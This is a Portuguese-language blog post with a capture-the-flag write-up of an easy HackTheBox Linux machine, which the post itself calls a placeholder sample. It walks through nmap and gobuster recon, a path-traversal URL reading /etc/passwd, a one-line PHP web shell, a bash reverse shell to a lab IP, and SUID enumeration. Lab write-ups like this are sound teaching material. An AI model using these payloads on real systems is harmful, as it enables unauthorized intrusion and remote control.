---
title: "HackTheBox - Exemplo Easy Machine"
date: 2025-12-20
draft: false
description: "Write-up completo de uma máquina Easy do HackTheBox"
tags: ["hackthebox", "web", "linux", "privilege-escalation"]
categories: ["CTF", "HackTheBox"]
series: ["HackTheBox Easy"]
showTableOfContents: true
---

## 🎯 Informações da Máquina

| Propriedade | Valor |
|-------------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **Sistema Operacional** | Linux |
| **IP** | 10.10.10.XXX |
| **Pontos** | 20 |

## 🔍 Reconhecimento

Iniciei o reconhecimento com um scan de portas usando **nmap**:

```bash
nmap -sC -sV -oN nmap/initial.txt 10.10.10.XXX
```

### Portas Abertas

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

## 🌐 Enumeração Web

Acessei o servidor web na porta 80 e encontrei uma aplicação web rodando.

### Tecnologias Identificadas
- Apache 2.4.41
- PHP 7.4
- MySQL

### Directory Bruteforce

```bash
gobuster dir -u http://10.10.10.XXX -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Diretórios encontrados:
- `/admin` - Painel de administração
- `/uploads` - Upload de arquivos
- `/backup` - Backups do sistema

## 💥 Exploração

### Vulnerabilidade Encontrada

Descobri uma vulnerabilidade de **Local File Inclusion (LFI)** no parâmetro `page`:

```
http://10.10.10.XXX/index.php?page=../../../../etc/passwd
```

### Web Shell Upload

Consegui fazer upload de um web shell PHP através de uma validação falha:

```php
<?php system($_GET['cmd']); ?>
```

### Reverse Shell

Estabeleci uma reverse shell:

```bash
# No atacante
nc -lvnp 4444

# No web shell
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

## 🔓 Privilege Escalation

### Enumeração Inicial

Após obter acesso como `www-data`, comecei a enumerar o sistema:

```bash
id
sudo -l
find / -perm -4000 2>/dev/null
```

### Exploração

Encontrei um binário SUID vulnerável que permitiu escalar privilégios para root.

## 🚩 Flags

### User Flag
```
Location: /home/user/user.txt
Flag: [REDACTED]
```

### Root Flag
```
Location: /root/root.txt
Flag: [REDACTED]
```

## 📚 Lições Aprendidas

1. **Sempre validar uploads** - A aplicação não validava corretamente arquivos enviados
2. **LFI é perigoso** - Permite leitura de arquivos sensíveis do sistema
3. **Binários SUID** - Sempre verificar permissões especiais durante enum
4. **Defense in Depth** - Múltiplas camadas de segurança são essenciais

## 🔗 Referências

- [OWASP - File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Nota**: Este é um write-up de exemplo para confirmar que o site está funcionando.
